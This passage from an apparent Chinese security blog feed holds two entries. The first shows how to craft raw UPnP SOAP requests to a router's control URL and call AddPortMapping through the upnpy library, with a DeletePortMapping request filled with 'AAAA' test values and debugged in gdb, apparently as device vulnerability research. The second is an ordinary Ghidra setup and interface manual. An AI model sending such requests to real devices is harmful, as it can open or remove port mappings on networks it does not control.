class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>3600<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueRange</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">minimum</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">minimum</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">maximum</span>&gt;</span>604800<span class="hljs-tag">&lt;/<span class="hljs-name">maximum</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueRange</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui2<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>InternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui2<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueRange</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">minimum</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">minimum</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">maximum</span>&gt;</span>65535<span class="hljs-tag">&lt;/<span class="hljs-name">maximum</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueRange</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>TCP<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>UDP<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>InternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">serviceStateTable</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scpd</span>&gt;</span></code></pre></div><p>分类统计有以下几种：</p><p>SetConnectionType,GetConnectionTypeInfo,RequestConnection,ForceTermination,GetStatusInfo,GetNATRSIPStatus,GetGenericPortMappingEntry,GetSpecificPortMappingEntry,AddPortMapping,DeletePortMapping,GetExternalIPAddress</p><p>通过构造POST请求，访问controlURL：<a href="http://10.0.0.1:56688/ctl/IPConn">http://10.0.0.1:56688/ctl/IPConn</a></p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ctl/IPConn</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.0.0.1:56688<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<span class="hljs-attribute">SOAPAction</span><span class="hljs-punctuation">: </span>&quot;urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress&quot;<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>260<span class="language-vim">&lt;<span class="hljs-variable">s:Envelope</span> xmln<span class="hljs-variable">s:s</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="hljs-variable">s:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span><span class="language-vim">​&lt;<span class="hljs-variable">s:Body</span>&gt;</span><span class="language-vim">​&lt;<span class="hljs-keyword">u</span>:GetExternalIPAddress xmln<span class="hljs-variable">s:u</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;</span>&gt;</span><span class="language-vim">​&lt;/<span class="hljs-keyword">u</span>:GetExternalIPAddress&gt;</span><span class="language-vim">​&lt;/<span class="hljs-variable">s:Body</span>&gt;</span><span class="language-vim">&lt;/<span class="hljs-variable">s:Envelope</span>&gt;</span></code></pre></div><p>重要的有head中的SOAPAction，构造方式为serviceType#action即：urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress</p><p>post参数来源action中的direction为in的参数，如果只有out参数，即可不用构造post参数，直接获取。</p><p>in参数的数据类型在serviceStateTable中可以获取</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ctl/IPConn</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>identity<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Python-urllib/3.11<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.0.0.1:56688<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>358<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml; charset=&quot;utf-8&quot;<span class="hljs-attribute">Soapaction</span><span class="hljs-punctuation">: </span>&quot;urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping&quot;<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">s:Envelope</span> <span class="hljs-attr">xmlns:s</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="hljs-attr">s:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">s:Body</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">u:DeletePortMapping</span> <span class="hljs-attr">xmlns:u</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">NewRemoteHost</span>&gt;</span>AAAA<span class="hljs-tag">&lt;/<span class="hljs-name">NewRemoteHost</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">NewExternalPort</span>&gt;</span>AAAA<span class="hljs-tag">&lt;/<span class="hljs-name">NewExternalPort</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">NewProtocol</span>&gt;</span>TCP<span class="hljs-tag">&lt;/<span class="hljs-name">NewProtocol</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;/<span class="hljs-name">u:DeletePortMapping</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;/<span class="hljs-name">s:Body</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">s:Envelope</span>&gt;</span></span></code></pre></div><p>通过gdb调试可以发现，可以获取到</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230829175431203.png" alt="image-20230829175431203"></p><p>python中又个upnpy库，可以很方便的执行上述步骤。</p><div class="code-wrapper"><pre><code class="hljs bash">python3 -m pip install upnpy</code></pre></div><p>使用方式</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> upnpy\<span class="hljs-comment">#获取upnp</span>upnp = upnpy.UPnP()\<span class="hljs-comment">#扫描，返回一个设备列表</span>devices = upnp.discover()\<span class="hljs-comment">#确定设备,两种方式都可以</span>devide = devices[<span class="hljs-number">0</span>]device = upnp.get_igd()\<span class="hljs-comment">#获取服务列表</span>services = device.get_services()\<span class="hljs-comment">#确定服务，同两种方式均可</span>service = services[<span class="hljs-number">0</span>] service = device[<span class="hljs-string">&#x27;WANPPPConnection.1&#x27;</span>] <span class="hljs-comment">#service id</span>\<span class="hljs-comment">#获取服务的actions，返回一个action列表</span>service.get_actions()\<span class="hljs-comment">#通过service.action[&#x27;name&#x27;]()可以执行</span>service.GetExternalIPAddress() <span class="hljs-comment">#&#123;&#x27;NewExternalIPAddress&#x27;: &#x27;10.100.40.182&#x27;&#125;</span>\<span class="hljs-comment">#通过service.action[&#x27;name&#x27;].get_input_arguments()可以获取参数</span>service.DeletePortMapping.get_input_arguments()\<span class="hljs-comment">#[&#123;&#x27;name&#x27;: &#x27;NewRemoteHost&#x27;, &#x27;data_type&#x27;: &#x27;string&#x27;, &#x27;allowed_value_list&#x27;: []&#125;, &#123;&#x27;name&#x27;: &#x27;NewExternalPort&#x27;, &#x27;data_type&#x27;: &#x27;ui2&#x27;, &#x27;allowed_value_list&#x27;: []&#125;, &#123;&#x27;name&#x27;: &#x27;NewProtocol&#x27;, &#x27;data_type&#x27;: &#x27;string&#x27;, &#x27;allowed_value_list&#x27;: [&#x27;TCP&#x27;, &#x27;UDP&#x27;]&#125;]</span>\<span class="hljs-comment">#发送服务</span>service.AddPortMapping(  NewRemoteHost=<span class="hljs-string">&#x27;&#x27;</span>,  NewExternalPort=<span class="hljs-number">80</span>,  NewProtocol=<span class="hljs-string">&#x27;TCP&#x27;</span>,  NewInternalPort=<span class="hljs-number">8000</span>,  NewInternalClient=<span class="hljs-string">&#x27;192.168.1.3&#x27;</span>,  NewEnabled=<span class="hljs-number">1</span>,  NewPortMappingDescription=<span class="hljs-string">&#x27;Test port mapping entry from UPnPy.&#x27;</span>,  NewLeaseDuration=<span class="hljs-number">0</span>)</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/article/0.html"/>
    <url>/article/0.html</url>
    
    <content type="html"><![CDATA[<p><strong>1.1 Ghidra背景</strong></p><p><strong>1.1.1 什么是Ghidra</strong></p><p>Ghidra是一个由美国国家安全局（NSA）研究部门创造并维护的软件逆向工程框架。这个框架包括了一套完善的软件分析工具，涵盖了反汇编、汇编、反编译、图形化以及许多其他有用的功能。</p><p>美国国家安全局于2019年3月将Ghidra开源放出。Ghidra的官方GitHub项目地址在 <a href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a> 。</p><p><img src="blob:file:///3333d5b7-4c46-4884-b848-266b0063445c" alt="202004030932_X468CWWAYFY7KSC.png"></p><p>图1-1 Ghidra的LOGO</p><p><strong>1.1.2 为什么用Ghidra*</strong>*</p><p><strong>(1) 基本功能</strong></p><p>Ghidra涵盖了同类型工具如IDA Pro、Radare、Binary Ninja等所拥有的大部分功能，并将这些功能完善地整合在了一起。Ghidra也支持大量的处理器指令集与可执行格式。</p><p><strong>(2) 兼容性</strong></p><p>用Java编写的Ghidra能够在Windows、macOS、Linux等主流平台上运行。</p><p><strong>(3) 对于团队作业的高度支持</strong></p><p>软件逆向工程可以是非常庞大的任务。用户可以通过配置Ghidra Server来简易可靠地实现多个用户共同工作的目标。Ghidra Server提供了权限管理、版本管理等功能。我们会在后面的章节讲到有关Ghidra Server的具体操作。</p><p><strong>(4) 定制化与高度可扩展性</strong></p><p>Ghidra整合了许多的【插件】，每个插件提供特定的功能。【工具】（tools）则是插件与插件配置的集合。用户可以自定义插件与工具的配置、创建新的工具、编写自己的插件。从UI到功能的可自定义性，Ghidra能够满足绝大多数用户的需求。</p><p><strong>(5) 操作撤回</strong></p><p>这是Ghidra提供的一个虽然小巧却非常实用的功能，允许用户对操作进行撤回（Undo）和重做(Redo)。当然，操作的储存深度也是可以由用户自定义的。</p><p><img src="blob:file:///fde779bb-5a0e-4537-8eb5-9869529ca23b" alt="202004030933_79SQBZDTYRNVCRQ.png"></p><p>图1-2 撤回与重做</p><p><strong>(6) 开源</strong></p><p>Ghidra在2019年3月之后已经被开源，协议为Apache License 2.0。该协议允许用户对代码进行更改与再发布。</p><p>图1-3 Ghidra的开源协议</p><p>而市面上主流的同类工具，以IDA Pro为例，则是价格不菲。</p><p><img src="blob:file:///90764224-7175-4f7d-ba1b-4e2d83dc08c8" alt="202004030933_GVCD7MYZWD89GJR.png"></p><p>图1-4 IDA Pro售价</p><p>#ghidra使用手册</p><p><strong>1.2 安装、配置环境与运行</strong></p><p><strong>1.2.1 配置要求</strong> </p><p><strong>硬件</strong></p><p>4GB RAM，1 GB 存储空间，双显示器或多显示器最佳</p><p><strong>平台</strong></p><p>Microsoft Windows 7 或 10 (64-bit)</p><p>Linux (64-bit, CentOS 7 最佳)</p><p>macOS (OS X) 10.8.3+</p><p>不支持32位的操作系统</p><p><strong>软件</strong></p><p>Java 11 Runtime and Development Kit（JDK）</p><p>推荐使用的环境为OpenJDK</p><p><strong>1.2.2 下载</strong></p><p>用户可以于Ghidra官网（<a href="https://ghidra-sre.org/%EF%BC%89%E4%B8%8B%E8%BD%BDGhidra%E7%9A%84%E6%9C%80%E6%96%B0%E5%8E%8B%E7%BC%A9%E5%8C%85%EF%BC%88%E5%8F%AF%E8%83%BD%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E7%BE%8E%E5%9B%BD%E4%BB%A3%E7%90%86%EF%BC%89%E3%80%82Ghidra%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E4%BC%A0%E7%BB%9F%E7%9A%84%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E5%B0%B1%E8%83%BD%E4%BD%BFGhidra%E5%8F%91%E8%A1%8C%E7%89%88%E5%9C%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%B0%B1%E4%BD%8D%E3%80%82%E4%BD%BF%E7%94%A8%E8%AF%A5%E6%96%B9%E6%B3%95%E7%9A%84%E5%A5%BD%E5%A4%84%E6%98%AF%EF%BC%8C%E4%B8%8D%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E4%BE%BF%E8%83%BD%E5%A4%9F%E5%AE%89%E8%A3%85Ghidra%E6%9D%A5%E4%BD%BF%E7%94%A8%E3%80%82%E5%8F%A6%E5%A4%96%EF%BC%8C%E7%A7%BB%E9%99%A4Ghidra%E5%8F%AA%E9%9C%80%E8%A6%81%E7%AE%80%E5%8D%95%E5%9C%B0%E5%88%A0%E9%99%A4Ghidra%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95%E3%80%82">https://ghidra-sre.org/）下载Ghidra的最新压缩包（可能需要使用美国代理）。Ghidra没有使用传统的安装程序，直接提取文件就能使Ghidra发行版在文件系统中就位。使用该方法的好处是，不需要管理员权限便能够安装Ghidra来使用。另外，移除Ghidra只需要简单地删除Ghidra的安装目录。</a></p><p><img src="blob:file:///a7bd0605-c774-4ce1-98d0-ef51419c73de" alt="202004030933_GAU3BZ9U9CYSHH3.png"></p><p>图1-5 下载</p><p><strong>1.2.3 配置环境</strong></p><p>Ghidra需要特定版本的JDK位于PATH中才能够运行。如果PATH中的Java版本Ghidra并不支持，它将使用该版本的Java来寻找用户系统中受支持的Java版本。如果仍然找不到受支持的Java版本，用户会被要求输入一个Java的主目录以供使用。</p><p>Ghidra是通过OpenJDK进行的开发与测试，因此我们建议使用这个OpenJDK来获取最稳定的体验。</p><p>如果Ghidra由于PATH中没有任何版本的Java而不能运行，用户需要手动安装一个受支持的JDK并将其添加到PATH，以下是操作流程：</p><p><strong>(1) Windows</strong></p><p>1 提取JDK发行版本(.zip文件)，之后</p><p>Windows 10: 右键点击左下角Windows键，然后点击【系统】</p><p>Windows 7: 点击左下角Windows键，右键点击【计算机】，点击【属性】</p><p>2 点击【系统信息】，之后点击【高级系统设置】</p><p>3 点击【环境变量】</p><p>4 在【系统变量】下方，选中Path，并点击【编辑】</p><p>5 在【编辑系统变量】的窗口中，在变量值的最后加入一个分号“;”，并接着输入&lt;JDK目录的路径&gt;bin</p><p>6 确认以上修改</p><p><strong>(2) Linux 与macOS (OS X)</strong></p><p>1 提取JDK。</p><p>tar xvf &lt;JDK文件.tar.gz&gt;</p><p>2 用编辑器打开~&#x2F;.bashrc，譬如</p><p>vi ~&#x2F;.bashrc</p><p>3 在文件最后，将JDK的bin目录加入PATH变量。</p><p>export PATH&#x3D;&lt;提取出的JDK目录路径&gt;&#x2F;bin:$PATH</p><p>4 保存文件。</p><p>5 重启所有终端来让改动生效。</p><p>在一些情况下，用户可能希望以特定版本的Java来启动Ghidra。我们设置support&#x2F;launch.properties中的JAVA_HOME_OVERRIDE。如果该属性被设置为一个不兼容的Java版本，Ghidra会自动定位一个兼容版本。需要注意的是，PATH中一定要存在某个Java来使JAVA_HOME_OVERRIDE属性生效。</p><p><img src="blob:file:///7fe12308-2fac-4798-8379-d72406fa52e1" alt="202004030934_TAEXD5KNR6BBJJN.png"></p><p>图1-6 JAVA_HOME_OVERRIDE属性</p><p><strong>1.2.4 运行</strong></p><p>切换至 Ghidra 所在目录</p><p><strong>(1) Windows</strong></p><p>运行ghidraRun.bat</p><p><strong>(2) Linux 与macOS （OS X）</strong></p><p>运行ghidraRun</p><p>在macOS上运行Ghidra，将显示如下主界面：</p><p><img src="blob:file:///6cbf9dc1-7502-4200-a477-d09ec3c25d5e" alt="202004030934_TD2JEB2PKQ6BBMM.png"></p><p>#ghidra使用手册</p><p><strong>1.3 初步的UI自定义</strong></p><p>在创建第一个项目之前，我们可以先将图形UI做一些初步的调整。在窗口点击Edit，之后点击Tool Options，再选择Tool，现在我们可以在Swing Look And Feel这里选择我们想要的主题，也可以勾选Use Inverted Colors来实现反转颜色。请注意部分的主题配上颜色反转会出现菜单字体颜色太淡的问题。更改完成后需要重新启动Ghidra才能使设置生效。</p><p><img src="blob:file:///4a40fdd0-193d-4bca-8b7b-3a8afa61b09f" alt="202004030934_364JNTCRY4E9PJJ.png"></p><p>图1-7 反转颜色与主题设置 </p><p>#ghidra使用手册</p><p> <strong>1.4 第一个项目</strong></p><p>配置好环境并运行Ghidra之后，我们可以点击File→New Project，或者使用快捷键Ctrl+N，来创建一个新项目。鉴于我们暂时先讲单人作业，选择Non-Shared Project，并接着输入项目目录与名称以完成项目的创建。</p><p><img src="blob:file:///84f21f27-401b-4984-bf17-e1178eb93ebe" alt="202004030935_KB4J4ZUFB5W5MPM.png"></p><p>图1-8 完成项目创建</p><p>之后我们便可以开始导入文件，我们可以简单地将文件拖入Ghidra窗口，也可以选择File→Import File（快捷键I）来导入文件。</p><p><img src="blob:file:///4ac76f2d-234e-4a5e-8b8e-2c899ac19d56" alt="202004030935_93Q3CQD8SNHFY59.png"></p><p>图1-9 导入文件</p><p>导入文件后，我们选择CodeBrowser（喷火的龙头图标）工具，也即是Ghidra自带的工具来打开文件。</p><p><img src="blob:file:///324cf6ed-de35-4745-ab77-b4ce3dbabfe6" alt="202004030936_26V735C6TF63BD9.png"></p><p>图1-10 打开文件</p><p>CodeBrowser已经是一个非常强大的工具，我们会在下一章开始介绍它的功能。</p><p>#ghidra使用手册</p><p><strong>2.1 界面介绍</strong></p><p>在用CodeBrowser打开我们的文件后，由于是第一次打开，Ghidra会提醒我们，需不需要对文件进行分析，我们选Yes并且以默认的分析工具设置对文件进行分析（直接点选Analyze）。</p><p><img src="blob:file:///974a7bf4-40c6-428f-850d-999c73364f1a" alt="202004030950_QFFRMN429PRG8PK.png"></p><p>图2-1 分析文件</p><p><img src="blob:file:///6dbe7925-f883-4050-977b-81d948467275" alt="202004030950_FB5PJSUC7ZBCZDW.png"></p><p>图2-2 默认配置</p><p>分析的进度会在界面右下角显示。</p><p>在本章，我们会对CodeBrowser工具中所涵盖的各个内置插件进行逐一的介绍。</p><p>打开工具后，我们能看到显示着几个默认的窗口。在本章我们介绍位于界面中间最大的窗口，也是CodeBrowser中的主要窗口，Listing View。</p><p><img src="blob:file:///b8882b93-1971-45f6-9b2c-9f49985d8744" alt="202004030951_NFUDV2VUN295SND.png"></p><p>图2-3 默认窗口</p><p>Listing View，我们接下来管他叫做【陈列窗口】，是展示程序指令和数据，并且与其交互的主要窗口。在下面的图中，陈列窗口展示了crackme_example程序的一部分。</p><p><img src="blob:file:///935ff513-14bf-4a9d-af34-af13359a5f06" alt="202004030951_52YQXPUKDJE7RZR.png"></p><p>图2-4 陈列窗口</p><p>陈列窗口展示了地址、字节、助记符、算子等信息。陈列窗口的整体结构可以通过Browser Field Formatter（我们会在2.2讨论它）来进行更改。该视窗默认显示整个程序的信息，在视窗大于屏幕大小的情况下（大部分的情况），我们都可以使用滚动条或者鼠标滚轮来进行视窗的上下移动。</p><p>此外，我们可以通过其他的Ghidra组件来将视窗展示内容限制在程序的某一个部分上。比如说，我们可以在Program Trees窗口中双击选中.rodata，即只读数据，这时陈列窗口便只显示.rodata段的内容了。</p><p><img src="blob:file:///71327e8e-bd7e-4e01-88e0-9a23d9afb646" alt="202004030952_37SHENXZUB8B3EN.png"></p><p>图2-5 只显示.rodata内容的陈列窗口</p><p><strong>2.1.1 光标与选择</strong></p><p>尽管陈列窗口不会对程序进行更改，它对于其他插件却非常重要。陈列窗口中一直保持着一个光标的位置，许多其他的插件需要作用于一个特定的地址，而这可以由陈列窗口中的光标来提供。比如，我们将光标放置于main函数中的一个位置，</p><p><img src="blob:file:///00e070cd-feb1-491a-a6d7-c0641450fcf2" alt="202004030952_EHB3HR3QFP5UDXT.png"></p><p>图2-6 放置光标于main函数中</p><p>之后点击Windows→Function Graph（关于这个窗口本身我们会在本章的后面进行介绍），我们就能够看到main函数的图形化展示了。</p><p><img src="blob:file:///4f29eb25-d960-4ab4-aff8-7e21742a9b7b" alt="202004030952_W83ZWH3JEZBYBA5.png"></p><p>图2-7 main的图形化展示</p><p>光标可以通过任意方向键，或者鼠标点击来进行移动。</p><p>此外，还有些插件作用于一个范围内的地址，所以我们还需要用到陈列窗口内的选择功能。我们可以按住鼠标左键拖动鼠标来进行选择，也可以在按住Shift按键的同时用方向键移动光标。</p><p>如果一段地址未被选中，按住Ctrl键并选中该段地址，可以将其添加到当前的选中范围中。反之，则可以将其从当前的选中范围中删除。</p><p>我们可以将选中的部分高亮显示。选中之后，右键点击，选择Program Highlight→Entire Selection，或者选中之后直接使用快捷键（Ctrl+H），便可以高亮显示该部分。</p><p><img src="blob:file:///04e593b4-3314-4a21-be05-34ebeed3cb60" alt="202004030953_8XWV6YDPGS82DTU.png"></p><p>图2-8 高亮显示部分</p><p>之后在同一个菜单下，我们也可以取消高亮显示的效果。</p><p>我们也可以用鼠标中键点击一个区域，这样能高亮所选的文本，并且所有相同的文本都会被高亮显示。譬如说，我们中键点击一个MOV指令，我们会发现，所有的MOV指令都被高亮显示了。只有大小写、所有字符都与选中的文本相同才会被该功能匹配。</p><p><img src="blob:file:///203d4c55-597f-428b-b109-63567154fd3c" alt="202004030953_M7UKEE439XBS3RN.png"></p><p>图2-9 中键高亮MOV</p><p><strong>2.1.2 导向</strong></p><p>陈列窗口提供了强大的导向功能。我们可以通过简单地双击地址或者标签来实现导向。如果想要前往的地址在程序内却不在当前视窗内，当前的视窗会延伸并涵盖至目标地址。</p><p><strong>2.1.3 标记</strong></p><p>Markers，我们称之为标记，指示着程序中一些特殊的位置。这些位置可以是用户自己添加的(Bookmarks)，也可以是某些Ghidra插件添加的。标记分为两种显示方式：边缘标记(Margin Marker)和导向标记(Navigation Marker)。</p><p>想要手动添加书签(Bookmarks)的话，我们可以将光标移动到指定位置，也可以选中一段地址，之后在右键菜单内点击Bookmark，或者使用快捷键Ctrl+D。</p><p><strong>边缘标记</strong></p><p>边缘标记位于陈列窗口的左侧，在当前展示的代码中指示位置。指示的位置可以是一个地址，也可以是一段地址。下图红框中标出的部分，便是边缘标记。</p><p><img src="blob:file:///71bb9177-21cb-46e6-b0aa-b6eda2bd4363" alt="202004030953_4S597AKXQPN53NE.png"></p><p>图2-10 边缘标记</p><p><strong>导向标记</strong></p><p>导向标记位于陈列窗口的右边。边缘标记只有处在展示的代码段中才会显示，而导向标记则会一直显示着当前整个视窗内所有的标记。因此，我们可以轻松地利用导向标记来在程序中进行导向。左键单击导向标记，陈列窗口中便会定位至标记的位置。</p><p><img src="blob:file:///4f6fe3e0-2114-4719-8abc-377c586c5a47" alt="202004030954_A3VM48BHT2EJU8F.png"></p><p>图2-11 导向标记</p><p>显示导向标记的区域竖直地分成两个部分，左边显示点标记，即是一个单独地址的标记。右半边显示区域标记，即是一段地址的标记。此外，我们还可以通过右键点击导向标记显示的区域来自定义显示的内容。</p><p><strong>2.1.4 流程箭头</strong></p><p>陈列窗口中的流程箭头图形化地展示了函数内的流程。Jump类指令的起点与终点都被用箭头连接了起来。有条件的跳转用虚线显示，而无条件的跳转用实线显示。</p><p><img src="blob:file:///eae41902-5096-45aa-a311-00b0e9c77af5" alt="202004030954_W8CYN7JCYKQMTXU.png"></p><p>图2-12 流程箭头</p><p>我们可以利用流程箭头来导向，双击一个流程箭头便可以导向至该跳转的终点。如果我们的光标已经在终点的地址，双击流程箭头便可以导向至起点。</p><p><strong>2.1.5 鼠标悬浮*</strong>*</p><p>陈列窗口还提供了悬浮窗口，当鼠标悬浮在有额外信息的区域上时，悬浮窗口会自动出现。悬浮窗口让我们在不重定位显示窗口的前提下，能够看到想要的信息。</p><p>比如，我们将鼠标悬浮于地址之上，就会出现一个显示偏移的悬浮窗口。</p><p><img src="blob:file:///3b60be62-5d02-4a15-ac9f-7839c65923ec" alt="202004030954_7ZCZN3R78DCJNGF.png"></p><p>图2-13 悬浮窗口</p><p>此外，悬浮窗口还作用于【内存引用】、【缩略文本】、【数据类型】、【函数名】以及【数量】上。</p><p>#ghidra使用手册</p><p><strong>2.2 Decompiler</strong></p><p>在CodeBrowser默认显示的窗口中，反编译窗口一样非常显眼。我们将先对Ghidra的反编译器本身进行介绍，对于其具体的操作则会在2.2.2当中说明。</p><p><strong>2.2.1 